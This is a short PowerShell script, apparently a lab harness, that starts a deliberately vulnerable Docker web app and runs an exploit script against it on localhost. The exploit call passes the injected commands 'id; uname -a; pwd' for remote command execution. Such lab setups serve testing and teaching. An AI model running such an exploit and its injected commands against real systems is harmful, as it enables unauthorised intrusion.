Write-Host "[*] Building and starting the vulnerable Docker container..."
docker-compose up -d --build

Write-Host "[*] Waiting for the container to be ready..."
Start-Sleep -Seconds 3

Write-Host "[*] Running the exploit..."
python exploit.py -u http://localhost:8080/index.php -c "id; uname -a; pwd"

Write-Host "[*] Done. You can bring down the environment with: docker-compose down"
